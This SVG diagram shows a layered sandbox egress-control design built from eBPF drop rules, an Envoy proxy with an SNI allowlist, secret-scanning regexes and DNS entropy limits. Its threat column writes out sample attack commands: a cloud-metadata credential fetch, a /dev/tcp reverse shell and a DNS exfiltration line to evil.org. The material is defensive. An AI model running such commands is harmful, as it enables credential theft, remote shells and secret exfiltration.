<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 450" width="100%" height="100%"
     font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif">
  <defs>
    <!-- Arrowhead markers -->
    <marker id="arr-navy" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#1e293b"/>
    </marker>
    <marker id="arr-teal" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#0f766e"/>
    </marker>
    <marker id="arr-burgundy" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#991b1b"/>
    </marker>
    <marker id="arr-ochre" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#92400e"/>
    </marker>
    <marker id="arr-slate" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#475569"/>
    </marker>
  </defs>

  <!-- Clean Canvas -->
  <rect width="960" height="450" fill="#ffffff"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 1: SANDBOXED NETWORK NAMESPACE (x=24 to 214, w=190)               -->
  <!-- ========================================================================= -->
  <g transform="translate(24, 20)">
    <rect width="190" height="410" rx="4" fill="#f8fafc" stroke="#991b1b" stroke-width="1.5"/>
    <rect width="190" height="28" rx="4" fill="#fee2e2" stroke="#991b1b" stroke-width="1.5"/>
    <text x="12" y="19" font-size="8.5" font-weight="700" fill="#991b1b">SANDBOX NETWORK NS</text>
    <text x="178" y="19" font-family="monospace" font-size="7.5" fill="#991b1b" text-anchor="end">veth0 / tap0</text>

    <!-- Sub-block 1: Configuration -->
    <g transform="translate(10, 36)">
      <rect width="170" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Interface Configuration</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">• Isolated Net Namespace</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">• No default host gateway</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#991b1b">0.0.0.0/0 route: unmapped</text>
      <text x="8" y="62" font-size="6.8" fill="#0f766e">Ambient network: A = 0</text>
    </g>

    <!-- Sub-block 2: Outbound Candidate Traffic -->
    <g transform="translate(10, 110)">
      <rect width="170" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="170" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Outbound Traffic Flows</text>

      <!-- Flow 1: Legitimate HTTPS -->
      <g transform="translate(8, 28)">
        <rect width="154" height="52" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#166534">1. Package Install (HTTPS)</text>
        <text x="6" y="24" font-family="monospace" font-size="7" fill="#15803d">pip install requests</text>
        <text x="6" y="36" font-family="monospace" font-size="7" fill="#475569">dst: pypi.org:443</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#166534">Legitimate tool fetch</text>
      </g>

      <!-- Flow 2: IMDS SSRF -->
      <g transform="translate(8, 86)">
        <rect width="154" height="58" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">2. Cloud IMDS SSRF</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">curl 169.254.169.254</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">  /latest/meta-data/iam</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Host credential theft threat</text>
      </g>

      <!-- Flow 3: Raw Reverse Shell -->
      <g transform="translate(8, 150)">
        <rect width="154" height="58" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">3. Raw IP Reverse Shell</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">bash -i &gt;&amp; /dev/tcp/</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">  198.51.100.1/4444</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Direct TCP C2 connection</text>
      </g>

      <!-- Flow 4: DNS Covert Tunnel -->
      <g transform="translate(8, 214)">
        <rect width="154" height="60" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">4. Covert DNS Tunnel</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">token=$(cat /etc/key)</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">dig $token.evil.org</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Secret exfiltration via UDP</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: Sandbox to eBPF -->
  <line x1="214" y1="225" x2="232" y2="225" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 2: LAYER 1 — KERNEL EBPF PACKET FILTER (x=234 to 464, w=230)       -->
  <!-- ========================================================================= -->
  <g transform="translate(234, 20)">
    <rect width="230" height="410" rx="4" fill="#f8fafc" stroke="#1e293b" stroke-width="1.5"/>
    <rect width="230" height="28" rx="4" fill="#f1f5f9" stroke="#1e293b" stroke-width="1.5"/>
    <text x="115" y="19" font-size="8.5" font-weight="700" fill="#1e293b" text-anchor="middle">LAYER 1: KERNEL EBPF FILTER</text>

    <!-- Sub-block 1: Architectural Mechanics -->
    <g transform="translate(10, 36)">
      <rect width="210" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Packet Filter Mechanics (tc hook)</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">• Evaluates before <tspan font-family="monospace">sk_buff</tspan> allocation</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">• Zero context switch; in-kernel drop</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#0f766e">D(p) = FORWARD iff dst==IP_proxy</text>
      <text x="8" y="62" font-family="monospace" font-size="7" fill="#991b1b">     else DROP (TC_ACT_SHOT)</text>
    </g>

    <!-- Sub-block 2: Ordered Disposition Rules Table -->
    <g transform="translate(10, 110)">
      <rect width="210" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="210" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Ordered eBPF Rules (Table 8.4)</text>

      <!-- Rule 1: IMDS Trap -->
      <g transform="translate(8, 26)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Rule 1: Link-Local IMDS Trap</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">dst == 169.254.0.0/16 or [fd00:ec2::254]</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Verdict: TC_ACT_SHOT (DROP + Alert)</text>
      </g>

      <!-- Rule 2: Intranet Trap -->
      <g transform="translate(8, 76)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Rule 2: Intranet RFC 1918 Trap</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">dst in {10.0/8, 172.16/12, 192.168/16}</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Verdict: TC_ACT_SHOT (Blocks Lateral)</text>
      </g>

      <!-- Rule 3: Raw IP Trap -->
      <g transform="translate(8, 126)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Rule 3: Raw Numeric IP Trap</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">Direct numeric IP without DNS lease</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Verdict: TC_ACT_SHOT (Reverse Shell Abort)</text>
      </g>

      <!-- Rule 4: Proxy Redirect -->
      <g transform="translate(8, 176)">
        <rect width="194" height="46" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#166534">Rule 4: Proxy Forward Match</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#14532d">dst == IP_proxy &amp;&amp; dport == P_proxy</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#166534">Verdict: TC_ACT_OK (FORWARD to Envoy)</text>
      </g>

      <!-- Rule 5: Default Deny -->
      <g transform="translate(8, 226)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Rule 5: Default-Deny Catch-All</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">Any unmatched outbound frame</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Verdict: TC_ACT_SHOT (Zero ambient)</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: eBPF to Envoy -->
  <line x1="464" y1="225" x2="482" y2="225" stroke="#0f766e" stroke-width="2" marker-end="url(#arr-teal)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 3: LAYER 2 — TRANSPARENT APPLICATION PROXY (x=484 to 714, w=230)   -->
  <!-- ========================================================================= -->
  <g transform="translate(484, 20)">
    <rect width="230" height="410" rx="4" fill="#f8fafc" stroke="#0f766e" stroke-width="1.5"/>
    <rect width="230" height="28" rx="4" fill="#ccfbf1" stroke="#0f766e" stroke-width="1.5"/>
    <text x="115" y="19" font-size="8.5" font-weight="700" fill="#0f766e" text-anchor="middle">LAYER 2: TRANSPARENT PROXY (ENVOY)</text>

    <!-- Sub-block 1: Proxy Infrastructure -->
    <g transform="translate(10, 36)">
      <rect width="210" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Proxy Mediation Enclave</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">• Terminated at loopback / internal vlan</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">• L7 deep inspection &amp; TLS termination</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#0f766e">Listening: IP_proxy:8443 (Mutual TLS)</text>
      <text x="8" y="62" font-size="6.8" fill="#334155">Cryptographic client identity check</text>
    </g>

    <!-- Sub-block 2: Inspection Engines -->
    <g transform="translate(10, 110)">
      <rect width="210" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="210" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">L7 Protocol Inspection Engines</text>

      <!-- Engine A: SNI Allowlist -->
      <g transform="translate(8, 26)">
        <rect width="194" height="74" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">A. TLS SNI Host Allowlist</text>
        <text x="6" y="24" font-size="7" fill="#475569">Extracts SNI before TLS handshake:</text>
        <rect x="6" y="28" width="182" height="18" rx="1" fill="#f0fdf4" stroke="#86efac" stroke-width="0.6"/>
        <text x="8" y="40" font-family="monospace" font-size="6.8" fill="#166534">MATCH: *.pypi.org, *.github.com → ALLOW</text>
        <rect x="6" y="50" width="182" height="18" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.6"/>
        <text x="8" y="62" font-family="monospace" font-size="6.8" fill="#991b1b">MISMATCH: evil-c2.com → 403 FORBIDDEN</text>
      </g>

      <!-- Engine B: Secret Scanner -->
      <g transform="translate(8, 106)">
        <rect width="194" height="78" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">B. Outbound Secret Redaction</text>
        <text x="6" y="24" font-size="7" fill="#475569">Regex deep payload scanner on POST bodies:</text>
        <rect x="6" y="28" width="182" height="42" rx="1" fill="#fef3c7" stroke="#fde68a" stroke-width="0.6"/>
        <text x="8" y="40" font-family="monospace" font-size="6.8" fill="#92400e">AWS: AKIA[0-9A-Z]{16}</text>
        <text x="8" y="50" font-family="monospace" font-size="6.8" fill="#92400e">GH:  ghp_[0-9a-zA-Z]{36}</text>
        <text x="8" y="62" font-size="6.5" font-weight="700" fill="#b45309">Action: Block POST &amp; Sever Session</text>
      </g>

      <!-- Engine C: DNS Resolver -->
      <g transform="translate(8, 190)">
        <rect width="194" height="84" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">C. Split-Horizon DNS Enclave</text>
        <text x="6" y="24" font-size="7" fill="#475569">• Strict query length cap: &lt; 50 chars</text>
        <text x="6" y="36" font-size="7" fill="#475569">• Shannon entropy filter: H(X) &gt; 4.2 drop</text>
        <rect x="6" y="42" width="182" height="34" rx="1" fill="#f0fdfa" stroke="#99f6e4" stroke-width="0.6"/>
        <text x="8" y="54" font-family="monospace" font-size="6.8" fill="#0f766e">dig $token.evil.org → NXDOMAIN</text>
        <text x="8" y="68" font-size="6.5" font-weight="600" fill="#0f766e">Rate-clamped: 30 bytes/sec exfil limit</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: Envoy to Verdict -->
  <line x1="714" y1="225" x2="732" y2="225" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 4: EGRESS VERDICT & NETWORK BOUNDARY (x=734 to 936, w=202)         -->
  <!-- ========================================================================= -->
  <g transform="translate(734, 20)">
    <rect width="202" height="410" rx="4" fill="#f8fafc" stroke="#1e293b" stroke-width="1.5"/>
    <rect width="202" height="28" rx="4" fill="#f1f5f9" stroke="#1e293b" stroke-width="1.5"/>
    <text x="12" y="19" font-size="8.5" font-weight="700" fill="#1e293b">EGRESS VERDICT &amp; FABRIC</text>

    <!-- Verdict 1: Approved -->
    <g transform="translate(10, 36)">
      <rect width="182" height="170" rx="3" fill="#ffffff" stroke="#16a34a" stroke-width="1.2"/>
      <rect width="182" height="22" rx="3" fill="#dcfce7" stroke="#16a34a" stroke-width="1.2"/>
      <text x="8" y="15" font-size="8" font-weight="700" fill="#15803d">PERMITTED EGRESS</text>

      <g transform="translate(8, 28)">
        <text x="0" y="12" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">pypi.org / files.python...</text>
        <text x="0" y="22" font-size="6.8" fill="#475569">Python wheel dependencies</text>

        <text x="0" y="38" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">api.github.com</text>
        <text x="0" y="48" font-size="6.8" fill="#475569">Authorized remote git push</text>

        <text x="0" y="64" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">registry.npmjs.org</text>
        <text x="0" y="74" font-size="6.8" fill="#475569">Node module resolutions</text>

        <rect y="86" width="166" height="46" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="83" y="100" font-size="7.5" font-weight="700" fill="#166534" text-anchor="middle">HTTP 200 OK</text>
        <text x="83" y="112" font-size="6.8" fill="#15803d" text-anchor="middle">Forwarded over Host eth0</text>
        <text x="83" y="124" font-size="6.8" fill="#15803d" text-anchor="middle">Clean Execution Pipeline</text>
      </g>
    </g>

    <!-- Verdict 2: Blocked / Trapped -->
    <g transform="translate(10, 214)">
      <rect width="182" height="182" rx="3" fill="#ffffff" stroke="#991b1b" stroke-width="1.2"/>
      <rect width="182" height="22" rx="3" fill="#fee2e2" stroke="#991b1b" stroke-width="1.2"/>
      <text x="8" y="15" font-size="8" font-weight="700" fill="#991b1b">BLOCKED / TRAPPED</text>

      <g transform="translate(8, 28)">
        <text x="0" y="12" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">169.254.169.254 (IMDS)</text>
        <text x="0" y="22" font-size="6.8" fill="#7f1d1d">Kernel eBPF drop → TC_ACT_SHOT</text>

        <text x="0" y="38" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">198.51.100.1:4444 (Raw TCP)</text>
        <text x="0" y="48" font-size="6.8" fill="#7f1d1d">Reverse shell aborted at L4</text>

        <text x="0" y="64" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">evil-c2.com (SNI Unlisted)</text>
        <text x="0" y="74" font-size="6.8" fill="#7f1d1d">HTTP 403 Forbidden → TCP RST</text>

        <rect y="86" width="166" height="60" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="83" y="100" font-size="7.5" font-weight="700" fill="#991b1b" text-anchor="middle">CONTAINMENT TRIGGERED</text>
        <text x="83" y="112" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Epistemic Audit Alert Emitted</text>
        <text x="83" y="124" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Sandbox Terminated via SIGKILL</text>
        <text x="83" y="136" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Zero Exfiltration onto Fabric</text>
      </g>
    </g>
  </g>
</svg>